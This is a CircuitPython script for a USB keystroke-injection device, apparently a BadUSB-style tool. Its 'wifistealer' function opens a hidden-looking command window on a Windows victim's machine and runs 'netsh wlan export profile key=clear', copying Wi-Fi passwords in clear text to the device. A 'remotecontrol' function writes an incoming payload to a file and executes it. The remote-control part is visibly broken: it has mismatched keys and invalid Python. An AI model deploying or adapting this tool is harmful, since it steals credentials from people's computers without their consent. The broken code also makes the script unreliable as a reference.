# by Juri Werth ---> https://github.com/juriwerth:

########################################################################################################################
# Imports:

import os, usb_hid, io, time, board, digitalio
from adafruit_hid.keyboard import Keyboard
from keyboard_layout_win_DE import KeyboardLayout
from keycode_win_DE import Keycode

########################################################################################################################
# Declarations:

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)

led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT

converter = {"1": ["utf-8", "%28"],
            "2": ["asci","("],
            "3": ["utf-8", "%29"],
            "4": ["asci", ")"],
            "5": ["utf-8", "%2A"],
            "6": ["asci", "*"],
            "7": ["utf-8", "%2B"],
            "8": ["asci", "+"],
            "9": ["utf-8", "%0D%0A"],
            "10": ["asci", "\n"],
            } # Möglicher fehler, eventluell \\n

########################################################################################################################
# Main body:

#     Wifi profile stealer:
#          This script will safe your (victims) wlan profile in the ~'wlan' folder inside the results folder.

def wifistealer(operatingsystem):
    print("Executing wifistealer()")
    folder = 'wlan'
    num = 0

    while folder + str(num) in os.listdir('results/wifistealer'):
        num += 1
    folder += str(num)
   
    if operatingsystem == "windows":
        kbd.send(Keycode.GUI, Keycode.R)
        time.sleep(.4)
        layout.write('cmd\n')
        time.sleep(.4)
        layout.write('color FE & mode con:cols=18 lines=1\n')
        layout.write('e:\n')
        layout.write('cd results/wifistealer\n')
        layout.write('mkdir '+folder+'\n')
        layout.write('netsh wlan export profile key=clear folder='+folder+'\n')
        kbd.send(Keycode.ALT, Keycode.F4)
        print('Extracted wlan profiles')

    elif operatingsystem == "mac":
        pass

    else: print("Error at passing operating system")
    
def remotecontrol(payload):
    print(payload)
    for obj in converter:
        try:    
            payload = payload.replace(obj["utf-8"], obj["ASCI"])
        except: pass
    with io.open("temp.py", "w") as f:
        f.write("def pythonpayload:")
        f.write(payload)
    from temp import pythonpayload
    pythonpayload()